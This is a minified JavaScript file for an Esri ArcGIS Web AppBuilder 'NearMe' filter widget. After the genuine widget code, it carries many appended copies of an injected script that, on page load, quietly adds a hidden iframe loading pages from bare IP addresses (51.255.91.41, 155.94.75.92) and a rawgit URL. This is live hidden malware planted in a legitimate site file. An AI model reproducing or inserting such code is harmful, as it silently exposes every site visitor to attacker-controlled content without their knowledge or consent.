// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/NearMe/filter-list.html":'\x3cdiv\x3e\r\n  \x3cul class\x3d"filter-list" data-dojo-attach-point\x3d"filterList"\x3e\x3c/ul\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/text!./filter-list.html dojo/_base/array dojo/_base/html dojo/_base/lang dojo/query dojo/on dijit/_WidgetsInTemplateMixin jimu/utils jimu/BaseWidget jimu/filterUtils jimu/dijit/FilterParameters jimu/LayerInfos/LayerInfos jimu/FilterManager esri/request dojo/NodeList dojo/NodeList-dom".split(" "),function(k,n,p,e,f,h,l,q,r,t,u,v,w,x,y){return k([t,q],{name:"NearMeFilter",templateString:n,baseClass:"jimu-widget-nearme-filter",_itemTemplate:'\x3cli class\x3d"filter-item" data-index\x3d"${index}"\x3e\x3cdiv class\x3d"header jimu-leading-padding1" \x3e\x3cspan class\x3d"arrow jimu-float-leading jimu-trailing-margin05" title\x3d"${toggleTip}" \x3e\x3c/span\x3e\x3cspan class\x3d"icon"\x3e\x3cimg src\x3d"${icon}" /\x3e\x3c/span\x3e\x3cspan class\x3d"item-title"\x3e${title}\x3c/span\x3e\x3cspan class\x3d"cando jimu-float-trailing jimu-leading-margin1 jimu-trailing-margin1 "\x3e\x3c/span\x3e\x3cspan class\x3d"doing jimu-float-trailing jimu-leading-margin1 jimu-trailing-margin1 "\x3e\x3c/span\x3e\x3cspan class\x3d"done jimu-float-trailing jimu-leading-margin1 jimu-trailing-margin1 "\x3e\x3c/span\x3e\x3c/div\x3e\x3cdiv class\x3d"body"\x3e\x3cdiv class\x3d"parameters"\x3e\x3c/div\x3e\x3cspan class\x3d"jimu-btn apply jimu-float-trailing jimu-trailing-margin25"\x3e${apply}\x3c/span\x3e\x3c/div\x3e\x3c/li\x3e',
_store:null,postCreate:function(){this.inherited(arguments);this._store={};this.layerInfosObj=w.getInstanceSync();this.filterUtils=new u;this.filterManager=x.getInstance();p.forEach(this.config.filters,function(a,b){var c=this.filterUtils.isAskForValues(a.filter);b={icon:a.icon?r.processUrlInWidgetConfig(a.icon,this.folderUrl):this.folderUrl+"/css/images/default_task_icon.png",index:b,title:a.name,toggleTip:this.nls.toggleTip,hasValue:c?window.appInfo.isRunInMobile?"block !important":"":"none",isAskForValue:c,
apply:f.getObject("jimuNls.common.apply",!1,window)||"Apply"};this._store[a.layerId]||(this._store[a.layerId]={mapFilterControls:{}});var d=f.replace(this._itemTemplate,b,/\$\{([^\}]+)\}/ig),g=e.toDom(d);e.place(g,this.filterList);this.own(h(".header",g).on("click",f.hitch(this,"enableFilter",g,a,b)));c?e.addClass(g,"has-ask-for-value"):e.addClass(g,"not-has-ask-for-value");"none"!==b.hasValue&&(this.own(h(".arrow",g).on("click",f.hitch(this,"configFilter",g,a))),this.own(h(".apply",g).on("click",
f.hitch(this,"applyFilterValues",g,a))),e.addClass(g,"requesting"),this.configFilter(g,a,null,f.hitch(this,function(){this.config.collapse&&e.removeClass(g,"config-parameters")})))},this)},startup:function(){this.inherited(arguments);this.resize()},_getPriorityOfMapFilter:function(a){a=f.getObject(a+".mapFilterControls",!1,this._store);var b=0,c;for(c in a){var d=a[c];d.priority>b&&(b=d.priority)}return b},_getMapFilterControl:function(a){a=f.getObject(a+".mapFilterControls",!1,this._store);var b=
!0,c;for(c in a){var d=a[c];0<d.priority&&(b=!!d.enable)}return b},_setItemFilter:function(a,b,c,d){this._store[a]["filter_item_"+b]=c;c=this._getPriorityOfMapFilter(a);f.setObject(a+".mapFilterControls.filter_item_"+b,{enable:d,priority:c+1},this._store)},_removeItemFilter:function(a,b){delete this._store[a]["filter_item_"+b];delete this._store[a].mapFilterControls["filter_item_"+b]},_getExpr:function(a){if(!this._store[a])return null;var b=[];a=this._store[a];for(var c in a){var d=a[c];d&&"mapFilterControls"!==
c&&b.push("("+d+")")}return b.join(" AND ")},_bindMapUpdateEvents:function(a,b){l.once(this.map,"update-start",f.hitch(this,function(){e.addClass(a,"applying");e.removeClass(a,"applied")}));l.once(this.map,"update-end",f.hitch(this,function(){b?e.addClass(a,"applied"):e.removeClass(a,"applied");e.removeClass(a,"applying")}))},enableFilter:function(a,b,c){if(!e.hasClass(a,"config-parameters")||a.filterParams&&a.filterParams.getFilterExpr())if(!c.isAskForValue||a.filterParams&&a.filterParams.getFilterExpr()){c=
b.layerId;var d=e.getAttr(a,"data-index"),g=null,f=this.layerInfosObj.getLayerInfoById(c),g=e.hasClass(a,"applied");f.isShowInMap()&&f.isInScale()?this._bindMapUpdateEvents(a,g?!1:!0):g?e.removeClass(a,"applied"):e.addClass(a,"applied");f=null;g?this._removeItemFilter(c,d):this._setItemFilter(c,d,a.filterParams?a.filterParams.getFilterExpr():b.filter.expr,b.enableMapFilter);g=this._getExpr(c);f=this._getMapFilterControl(c);this.filterManager.applyWidgetFilter(c,this.id,g,f);this.filtersUpdated=!0}else this.configFilter(a,
b)},configFilter:function(a,b,c,d){a.filterParams?(e.hasClass(a,"config-parameters")?(e.removeClass(a,"config-parameters"),this._changeItemTitleWidth(a,window.appInfo.isRunInMobile?60:45)):(e.addClass(a,"config-parameters"),this._changeItemTitleWidth(a,60)),d&&d()):y({url:b.url,content:{f:"json"},handleAs:"json",callbackPrams:"callback"}).then(f.hitch(this,function(c){e.addClass(a,"config-parameters");e.removeClass(a,"requesting");var g=h(".parameters",a)[0];a.handles=[];a.filterParams=new v;var k=
f.clone(b.filter),m=null;b.enableMapFilter&&(m=b.layerId);a.filterParams.build(b.url,c,k,m);this.own(l(a.filterParams,"change",f.hitch(this,function(b){b?(h(".apply",a).removeClass("disable-apply"),a.expr=b):(delete a.expr,h(".apply",a).addClass("disable-apply"))})));a.expr=a.filterParams.getFilterExpr();a.expr?h(".apply",a).removeClass("disable-apply"):(delete a.expr,h(".apply",a).addClass("disable-apply"));a.filterParams.placeAt(g);this._changeItemTitleWidth(a,60);d&&d()}));c&&c.target&&c.stopPropagation()},
applyFilterValues:function(a,b,c){var d=a.filterParams&&(a.expr||a.filterParams.getFilterExpr());if(d){a.expr=d;var d=b.layerId,g=e.getAttr(a,"data-index"),f=this.layerInfosObj.getLayerInfoById(d);f.isShowInMap()&&f.isInScale()?this._bindMapUpdateEvents(a,!0):e.addClass(a,"applied");this._setItemFilter(d,g,a.expr,b.enableMapFilter);a=this._getExpr(d);b=this._getMapFilterControl(d);this.filterManager.applyWidgetFilter(d,this.id,a,b);this.filtersUpdated=!0}c.stopPropagation()},resize:function(){this.inherited(arguments);
this._changeItemTitleWidth(this.domNode,window.appInfo.isRunInMobile?60:45)},_changeItemTitleWidth:function(a,b){var c=h(".header",a)[0];c&&(b=e.getContentBox(c).w-b,0<b&&h(".header .item-title",a).style({maxWidth:b+"px"}))},destroy:function(){h(".filter-item",this.filterList).forEach(function(a){delete a.filterParams;delete a.expr});if(this._store)for(var a in this._store)a&&this.filterManager.applyWidgetFilter(a,this.id,"",null);this.inherited(arguments)},filterListShown:function(){this.filtersUpdated=
!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});